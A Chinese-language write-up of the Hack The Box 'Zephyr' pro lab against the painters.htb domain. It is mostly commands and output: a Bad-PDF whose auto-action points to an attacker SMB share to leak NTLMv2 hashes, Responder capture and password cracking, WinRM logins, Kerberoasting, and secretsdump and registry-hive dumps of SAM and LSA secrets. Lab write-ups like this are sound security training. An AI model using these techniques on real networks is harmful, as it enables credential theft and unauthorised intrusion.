---
toc_max_heading_level: 6
---
# Zephyr
## 场景描述
## 网络拓扑及攻击手法
## 10.10.110.0/24(nmap)
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# nmap 10.10.110.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 08:01 CST
Nmap scan report for bogon (10.10.110.2)
Host is up (0.40s latency).
All 1000 scanned ports on bogon (10.10.110.2) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for painters.htb (10.10.110.35)
Host is up (0.27s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 256 IP addresses (2 hosts up) scanned in 87.62 seconds
```
### 10.10.110.35(入口机、网卡一\mail)
详细版本扫描
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop/Bad-Pdf]
└─# nmap -sV -sC -p22,80,445 10.10.110.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 08:55 CST
Nmap scan report for painters.htb (10.10.110.35)
Host is up (0.20s latency).

PORT    STATE    SERVICE      VERSION
22/tcp  open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ca:e7:7e:99:03:a9:78:e8:86:2e:e8:cc:2b:9f:08 (RSA)
|   256 b1:7f:c0:06:9b:e7:08:b4:6a:ab:bd:c2:96:04:23:49 (ECDSA)
|_  256 0d:3b:89:bc:d5:a4:35:e0:dd:c4:22:14:7a:48:ad:7c (ED25519)
80/tcp  open     http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://painters.htb/home
445/tcp filtered microsoft-ds
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::warning 
因为访问10.10.110.35浏览器会自动解析成`https://painters.htb/home`导致不能连接服务器，所以我们必须把域名和ip绑定，即hosts  -> 10.10.110.35 painters.htb
:::
vacancies

发现可以上传pdf

:::tip 
经过Lamber提醒，所以知道bad-pdf钓鱼方法进行攻击
:::
#### badpdf
GitHub寻找项目`https://github.com/deepzec/Bad-Pdf`
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop/Bad-Pdf]
└─# cat hf.pdf                                                

%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
           /O <<
              /F (\\\\10.10.14.9\\test)
                  /D [ 0 /Fit]
                  /S /GoToE
                  >>

           >>

           /Parent 2 0 R
           /Resources <<
                        /Font <<
                                /F1 <<
                                        /Type /Font
                                        /Subtype /Type1
                                        /BaseFont /Helvetica
                                        >>
                                  >>
                                >>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj


trailer
<<
        /Root 1 0 R
>>

%%EOF

```
:::note
本质是hr在带有老版本的adobe域内点击了badpdf，导致NTLMv2-SSP Hash发送到`\\\\10.10.14.9\\test`,所以我们开始监听就好了
:::
```python
player@HTB-pro-labs:~$ sudo /root/github/Responder/Responder.py -I tun0 -F -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.9]
    Responder IPv6             [dead:beef:2::1007]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-MHEQOF5VP8L]
    Responder Domain Name      [PO9L.LOCAL]
    Responder DCE-RPC Port     [48062]

[+] Listening for events...

[!] Error starting SSL server on port 5986, check permissions or other servers running.
[!] Error starting SSL server on port 443, check permissions or other servers running.
[!] Error starting SSL server on port 636, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.110.35
[SMB] NTLMv2-SSP Username : PAINTERS\riley
[SMB] NTLMv2-SSP Hash     : riley::PAINTERS:53c64658d8d385f2:D5400AE66AF0FEAA810A5BA5D28C2E3F:010100000000000080D5D41498B5DA015CFAE691A8785C93000000000200080050004F0039004C0001001E00570049004E002D004D004800450051004F00460035005600500038004C0004003400570049004E002D004D004800450051004F00460035005600500038004C002E0050004F0039004C002E004C004F00430041004C000300140050004F0039004C002E004C004F00430041004C000500140050004F0039004C002E004C004F00430041004C000700080080D5D41498B5DA01060004000200000008003000300000000000000000000000002000009362064276D8FE84BF59334519405635765FD93A3A806E37B16B1DF51AF65E190A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0039000000000000000000
```
拿到hash的时候第一时间就想到爆破
```python
┌──(rookie㉿Rookie)-[~/Desktop]
└─$ john aaa -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd         (riley)     
1g 0:00:00:00 DONE (2024-06-03 17:56) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
<!-- #### 问答环节
:::danger 问题
```
1、在Linux的web网页，为什么会反弹出NTLMv2-SSP Hash 
2、为什么Linux用NTLMv2-SSP Hash的账户密码登陆
```
:::
:::tip 回答
```
1、web网页只负责收集pdf，而hr工作的地方是Windows环境，hr在域内点击查看
2、密码复用，是域内很常见的攻击方法
``` -->
:::
尝试登陆
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop/Bad-Pdf]
└─# ssh riley@10.10.110.35 
riley@10.10.110.35's password: P@ssw0rd

riley@mail:~$ ls
agent  flag.txt  nmap 
riley@mail:~$ cat flag.txt 
ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}  #人类的错误是致命的
```
#### 发现内网段192.168.110.*
```python
riley@mail:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.110.51  netmask 255.255.255.0  broadcast 192.168.110.255
        inet6 fe80::250:56ff:fe94:c339  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:c3:39  txqueuelen 1000  (Ethernet)
        RX packets 39041  bytes 32330274 (32.3 MB)
        RX errors 0  dropped 51  overruns 0  frame 0
        TX packets 33522  bytes 16083072 (16.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 32560  bytes 2332756 (2.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 32560  bytes 2332756 (2.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
##### arp嗅探
```python
riley@mail:~$ arp -a
? (192.168.110.56) at 00:50:56:b9:84:a9 [ether] on eth0
? (192.168.110.53) at 00:50:56:b9:aa:8d [ether] on eth0
? (192.168.110.52) at 00:50:56:b9:dc:9e [ether] on eth0
? (192.168.110.55) at 00:50:56:b9:75:58 [ether] on eth0
? (192.168.110.54) at 00:50:56:b9:cc:cd [ether] on eth0
_gateway (192.168.110.1) at 00:50:56:b9:fb:40 [ether] on eth0
```
发现如下ip
:::info
```
192.168.110.1  (firewall)
192.168.110.51 (入口机、网卡二)
192.168.110.52
192.168.110.53
192.168.110.54
192.168.110.55
192.168.110.56
```
:::
## 192.168.110.56(WKST)
```python
riley@mail:~$ ./nmap -Pn -T4 -sT --min-rate="1000" -p-  192.168.110.56

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-05 06:33 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.110.56
Host is up (0.00056s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
5985/tcp open  unknown
```
### 尝试使用域内用户riley登陆
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# proxychains evil-winrm -u riley -p P@ssw0rd  -i 192.168.110.56
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  192.248.165.125:58888  ...  192.168.110.56:5985  ...  OK
*Evil-WinRM* PS C:\Users\riley\Documents>
*Evil-WinRM* PS C:\Users\riley\Documents> cd ../../Administrator/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
ZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}
```
## bloodhound信息收集
:::info
如下,在信息收集之前我们需要上传内穿工具,我们使用scp是支持ssh端口传输的
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# scp /home/rookie/Desktop/chisel  riley@10.10.110.35:/home/riley/    

riley@10.10.110.35's password: 
chisel                                                                                             100% 8452KB 498.8KB/s   00:16    

```
:::
### 使用riley(域用户)访问ldap
ldap(轻型目录访问协议)
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# proxychains ./rusthound -d painters.htb -i 192.168.110.55 -u 'riley@painters.htb' -p 'P@ssw0rd'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
---------------------------------------------------
Initializing RustHound at 16:08:27 on 06/13/24
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2024-06-13T08:08:27Z INFO  rusthound] Verbosity level: Info
[proxychains] Strict chain  ...  192.248.165.125:59000  ...  192.168.110.55:389  ...  OK
[2024-06-13T08:08:28Z INFO  rusthound::ldap] Connected to PAINTERS.HTB Active Directory!
[2024-06-13T08:08:28Z INFO  rusthound::ldap] Starting data collection...
[2024-06-13T08:08:29Z INFO  rusthound::ldap] All data collected for NamingContext DC=painters,DC=htb
[2024-06-13T08:08:29Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2024-06-13T08:08:29Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2024-06-13T08:08:29Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2024-06-13T08:08:29Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2024-06-13T08:08:29Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 12 users parsed!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_users.json created!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 60 groups parsed!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_groups.json created!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 6 computers parsed!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_computers.json created!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 1 ous parsed!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_ous.json created!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 1 domains parsed!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_domains.json created!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 2 gpos parsed!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_gpos.json created!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 21 containers parsed!
[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_containers.json created!

RustHound Enumeration Completed at 16:08:29 on 06/13/24! Happy Graphing!
```
### kerberoasting攻击

#### GetUserspn获取spn和hash
spn是服务主体名称
##### 获取spn
```python
┌──(root㉿Rookie)-[/home/…/Desktop/github/impacket/examples]
└─# proxychains python  GetUserSPNs.py -dc-ip 192.168.110.55 -target-domain painters.htb painters.htb/riley:P@ssw0rd
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0.dev1+20240507.102706.4e3e668a - Copyright 2023 Fortra

[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:389  ...  OK
ServicePrincipalName   Name     MemberOf  PasswordLastSet             LastLogon                   Delegation  
---------------------  -------  --------  --------------------------  --------------------------  -----------
HTTP/dc.painters.htb   blake              2024-06-14 05:56:29.800756  2024-06-14 06:00:40.747333  constrained 
HTTP/svc.painters.htb  web_svc            2023-05-24 14:50:47.043365  2024-06-13 21:19:51.683396 
```
##### blake的hash
```python
┌──(root㉿Rookie)-[/home/…/Desktop/github/impacket/examples]
└─# proxychains python  GetUserSPNs.py -dc-ip 192.168.110.55 -target-domain painters.htb painters.htb/riley:P@ssw0rd -request-user blake
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0.dev1+20240507.102706.4e3e668a - Copyright 2023 Fortra

[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:389  ...  OK
ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  -----  --------  --------------------------  --------------------------  -----------
HTTP/dc.painters.htb  blake            2024-06-14 05:56:29.800756  2024-06-14 06:00:40.747333  constrained 



[-] CCache file is not found. Skipping...
[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK
[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK
[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK
$krb5tgs$23$*blake$PAINTERS.HTB$painters.htb/blake*$401c17fd1b2c3f14e4140a553e2b6d42$1aa1caa1dfc49df5d2047267b06adfc9bcc7f03f249836a979fa5d51ae59cc02d7bfa4e4c63ff47d771f0d35ccff7d180ef538405df9bd4a67eea9b13f10e31de5b5db0a9366ae0ccd6df8ad294584c1745a1a75dd53ba1cb51b4a49f792a3ca0d69f5890db29cfb089775f7f468551aa4221706d6c0d6e723547b0da70053533185f1b90eaa1344190fe3532b15573c7e6b972e11713f005742b0e5575b2766fd0d2cb8e1a1c4e63b67342261b1cae8f03e94ae989181938d282cd8d2e0dad2e9f168d3346efca47af4f2eec4307c9bfafac0662b4140449f4be2952d7ccbe4adc142ea6652119b8b69538d7179756bbd5f7d068971488e657480cbfcf6dcea86601a14ff6d71f41b8bea5b4cba2b287cabe1d93b7d1a2da84e7b313b8163ce624159cd700681cdb417650ad99a6250d2410f38774f627ee386b5f6be10857f8bafab4a14dc92b13334e681f6633d9f03c2f9e3cbf7c31e8c41f7cb6c01a7cbf448e445c151af463cf739c6092de71a6739ee83b3976f16c4a1ded6bf3d835874565be200845cb98022b6d0f5f9b51996a059ce99cd0987434b104430ee6c47a63ec77ded9abf9c568cee07f05cda02528bda466ecb1ff6462041d2be3b6b66a9bf754868714ebad73b106a83fa61a3a2906630cede73f04fc4f875a67508fb76a2085186ab42dfae9c6f843b9553830fa2aadd22c289a33387384987a6bf883d8d872353852589cc3c74ed8fe5bbfa920afbc883021d3143481371741db03ff6b5bb44d321b1ac695647fbc0587961e72999d0b8f226d6bd7d400c996e509f8128d339a59620495f61a827c48928a49529f815a2a7f649726b11215736013e10f35d43d426bd68afc3f8be74e1ea427e183989de23b11624ca22eaf2b0788d717c5d0e4442b6cf8a0adea08c82713790a98a3ed034111891b607618013010b1637b271372f1d0dbb440d558e47411fe783fadbe6ab9b3bfeac416fa4da6ef4de21f8fbfeaa43261c31fc5b225d1e47e075af75134e403ee23add14030e71fe2f852b357c30745842bf2f0f6dbc5bcf3a4a90bc3bdb6b72265325cf253350d1e90a26560ce4a8bb525c6c7bafc3b705235265a53283ea3dc4fceca7b9d498e9eaccdf819d240a6962919eedf295fadcc6caf60db97a8ba87dfc0251f8ebd26f3e54bf84fd08e50002cff846ba0886ff83db594e89cd3056b106fa75a63a26d25ff0449528760bd89a05f73c15f18856fec569eee93d84f6972d6b23ff68e20f14ed62061366ab9182066448dc785efb84119300d3bb14ced8a78bc75f705911386682d4e4c36f89ba3127e498009ae081d30ffae1a7ba340f73cf537e92801ff0a0ab28486618e057d3445f0e212ea6313e3f20baddbdcf17fd218f6edfed21aab4436d882cabbb7cc8d11f8ad330b87c22cd782bb2cd2d66d82b3569f5708af213a1295138c67edcf0
```
爆破hash(没有爆破出来)
```python 
john aaa --wordlist=/usr/share/wordlists/rockyou.txt            
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:04 DONE (2024-06-14 08:39) 0g/s 3138Kp/s 3138Kc/s 3138KC/s !SkicA!..*7¡Vamos!
Session completed.
```
##### web_svc的hash
```python
┌──(root㉿Rookie)-[/home/…/Desktop/github/impacket/examples]
└─# proxychains python  GetUserSPNs.py -dc-ip 192.168.110.55 -target-domain painters.htb painters.htb/riley:P@ssw0rd -request-user web_svc
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0.dev1+20240507.102706.4e3e668a - Copyright 2023 Fortra

[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:389  ...  OK
ServicePrincipalName   Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
---------------------  -------  --------  --------------------------  --------------------------  ----------
HTTP/svc.painters.htb  web_svc            2023-05-24 14:50:47.043365  2024-06-13 21:19:51.683396             



[-] CCache file is not found. Skipping...
[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK
[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK
[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK
$krb5tgs$23$*web_svc$PAINTERS.HTB$painters.htb/web_svc*$c2f373a33794a9fc942b8c09591ab3b8$f0c395583f8a92d54748ca057028e787f2fe8fc64a09a58d6f68c8de849f2c5165dca6eba7cbea7527eb4d5d2987bf9494d7dd1369c29eaa6b74540aba399e3f503fabfb247cf3ba222eff1237a0fe6593e8ad67004dae99653a75887183797148cb3e5ac5c39ed74360a0bbd87a35c294658328022dfb3ed60727df9f10554065facd81481ed9630c492a78b115eef9c8d87bf752a1f6a9417d5b60d01bfd920906106b833393d7ae39d8966e48303920d158cbcb3044e1ffa4478985b455370bd57b379b1e9f67a3c7d91d1763ea17247b8767dc4c7f1ae0a61b0b70d47dfc98ec39034d03afde2982dc89d168ccfb197137d7e6558203bc64f5096c38d93fb8f1df4908b9df50fb1784527b6dbb3a1c5ec6826ff21f33cbb3867f77ec034852851732ae848c056e5821eaea71065e41915d9a4b1f90fa0f71aae45b0327c8dbf23a555ac36da5fb1ed87d0ff6fd65cccc5cb5197056ad1cbbdc98f62301f7c640bae28db5fd7868beca724569b945fdce935eeb4a07a5c171bc6a045811b453ecfbc5dd344c2f8611c957f04e7ada34a075e9bf9e9615f1874af50985c96391c986c7d794f5a22d97cac8826f3b7c2bc5b035474d621ce7deb652da921ef78c31d7d2978c33fa72d17469e65edbf297a95c0b26abb1b4aa1badc7f4f111834ff550e9f6d518907eda98aa96c7ec99799e8804ffbfb29b99564e6fe368112e6d53a39dc5614c365f54ccf290d2be3f285005c28b7df374f2c8e521311c718a288a4f68befabdcfded8455bd70f4490b2bb9a72edf08f75e62d526fdda72fd9919382efcc8cc7c5a27a612c5d3f5e674ad690911794897b9d56c346ab7eea9352456c58a68d13871c28034ddabc666a49ce1c2db186ae4cc2badda5a1670c0ddf7a20371f2c45587310ee2eb7166816c429bb3b4cbfefa9e8f2e2200a256813c06ad7dac957de1102189a97f49f5e518bf6bcc32b945eec5d75ac747d85778a38ea257c4dd420a5c9322ef84dbb3cc15d5c405ef9dc4d64b5efd43eadab9b681792ec8a0e38a8c54a0a2a876b21e899ff8a6948bbd3946a194b50f83c32f159b5fdd98d8b40304563d867849471656b47b10d0a512016ca0b5616b9bc9ef90bbadaad42f2f3a1c032a340492dd961c0673e885e79828ba6ac489988b562d2ede6ffef978c07b23d76b91c8fe492c388281a594b753699cfe2ba0a4eff274e5b93a6a743f50bc8864cb8c0d1e613ba4b946402a294e848d5e122f52f61c9c72a70e2efbc2a8ae75e9746017cef8e5dc771b20e4042e8d11f3c2387e4c9f024aa18f33108ca6b89c5570d50a3804ecce02f6e249d226e6c8985c009ca60a48fc12af417b2ed23ef5b6591a154cc01f2d632fa3795bfe0322d6071ee2df71bad48a147818f7b7afabd9c580a56b03e43b290965be635fec7fe9002daa94c094ee23a5111823fefb53765bf
```
爆破hash
```python
┌──(root㉿Rookie)-[/home/…/Desktop/github/impacket/examples]
└─# john bbb --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ1qaz         (?)     
1g 0:00:00:00 DONE (2024-06-09 23:11) 7.692g/s 315076p/s 315076c/s 315076C/s holabebe..loserface1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
## 192.168.110.52(nmap\web_svc) 
```python
riley@mail:~$ ./nmap -Pn -T4 -sT --min-rate="1000" -p-  192.168.110.52
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-05 06:46 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.110.52
Host is up (0.0047s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  unknown
```
### 密码登陆
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# proxychains evil-winrm -u web_svc -p '!QAZ1qaz'  -i 192.168.110.52
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  192.248.165.125:61001  ...  192.168.110.52:5985  ...  OK
*Evil-WinRM* PS C:\Users\web_svc\Documents>
```
### 拖hash值
#### 远程拖(445开放)
```python
┌──(root㉿Rookie)-[/home/…/Desktop/github/impacket/examples]
└─# proxychains python secretsdump.py  painters.htb/web_svc:'!QAZ1qaz'@192.168.110.52
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0.dev1+20240507.102706.4e3e668a - Copyright 2023 Fortra

[proxychains] Strict chain  ...  192.248.165.125:61001  ...  192.168.110.52:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb131ea5c8206a94e3d32119d035961a9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6ee87fa6593a4798fe651f5f5a4e663e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
[*] Dumping cached domain logon information (domain/username:hash)
PAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2023-12-15 06:13:08)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PAINTERS\PNT-SVRSVC$:aes256-cts-hmac-sha1-96:a31b4a0de42a441e47dad46f283105a9eeaf023831336cf2b2933c2907a63c4a
PAINTERS\PNT-SVRSVC$:aes128-cts-hmac-sha1-96:0f5239792536fef683f21de1925b8ca4
PAINTERS\PNT-SVRSVC$:des-cbc-md5:9e89f79eb37f1fcb
PAINTERS\PNT-SVRSVC$:plain_password_hex:9c2295062db39652dd63b214344ce839af0ab487e64efc62923556fd6515e24f383f0f9a34006bae1f108446483b2e8c54a2d0bd08388b0e47dc12ad75a1859c45c917072bb683477e379108ff3131bcb52a4d4a2046c6c6f6252945e4b4e3c465a33a379854b4771e7cec30db10df8990bb0867c826c50d8d0646d4f817d70becbf98058e81d6a5b0f606263ea3c6495ff553bef55ee6fe109d03e5237ad0061f9ed7f0694d5c9be2a87379b82491871df259d251ff8a114d76961009551f53a5abaa1d51d7aa1d06d6e730a1a14797d33f71c3690eea3a00a09711f2053872d9dc815e3de06808e6b681c737cc9e33
PAINTERS\PNT-SVRSVC$:aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6a28296d276ce0627958e99cfbcab0b54ff64355
dpapi_userkey:0xaf502a3258e233f29ce3ca24257f5877965bb87d
[*] NL$KM 
 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W
 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..
 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%
 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.
NL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```
#### 本地拖
```python
*Evil-WinRM* PS C:\Users\web_svc\Documents> reg save hklm\sam C:\sam.save 
The operation completed successfully.

*Evil-WinRM* PS C:\Users\web_svc\Documents> reg save hklm\security C:\security.save 
The operation completed successfully.

*Evil-WinRM* PS C:\Users\web_svc\Documents> reg save hklm\system C:\system.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\web_svc\Documents> cd ../../../
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   9:15 AM                PerfLogs
d-r---         2/15/2023  11:08 AM                Program Files
d-----          3/8/2022   1:53 PM                Program Files (x86)
d-r---         6/14/2024  10:34 AM                Users
d-----         12/6/2023   3:50 AM                Windows
-a----         6/14/2024  10:35 AM          61440 sam.save
-a----         6/14/2024  10:35 AM          40960 security.save
-a----         6/14/2024  10:35 AM       13447168 system.save


*Evil-WinRM* PS C:\> download sam.save
[proxychains] Strict chain  ...  192.248.165.125:61002  ...  192.168.110.52:5985  ...  OK
[proxychains] Strict chain  ...  192.248.165.125:61002  ...  192.168.110.52:5985  ...  OK
                                        
Info: Downloading C:\\sam.save to sam.save
                                        
